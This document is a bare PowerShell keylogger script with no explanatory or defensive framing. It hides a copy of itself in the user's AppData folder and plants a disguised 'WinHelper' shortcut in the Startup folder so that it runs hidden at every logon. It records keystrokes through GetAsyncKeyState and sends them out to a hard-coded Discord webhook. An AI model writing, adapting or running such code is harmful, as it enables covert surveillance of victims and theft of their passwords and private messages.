# === CONFIG ===
$webhook = 'https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT'

# === PERSISTENCE SETUP ===
$targetPath = "$env:APPDATA\System32\k.ps1"
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = Join-Path $startupFolder "WinHelper.lnk"

# Copy to hidden location if not already
if (!(Test-Path $targetPath)) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $targetPath -Force
    attrib +h $targetPath
}

# Create shortcut on startup
if (!(Test-Path $shortcutPath)) {
    $WScriptShell = New-Object -ComObject WScript.Shell
    $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-w hidden -NoP -Ep Bypass -File `"$targetPath`""
    $shortcut.IconLocation = "shell32.dll, 17"
    $shortcut.Save()
}

# === KEYLOGGER LOOP ===
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;

public class KL {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
}
"@

$log = ""
while ($true) {
    Start-Sleep -Milliseconds 100
    for ($i = 1; $i -le 254; $i++) {
        if ([KL]::GetAsyncKeyState($i) -eq -32767) {
            $k = [char]$i
            $log += $k
        }
    }

    if ($log.Length -ge 10) {
        $body = @{ content = "**Keylog**: $log" } | ConvertTo-Json -Compress
        try {
            Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
        } catch {}
        $log = ""
    }
}
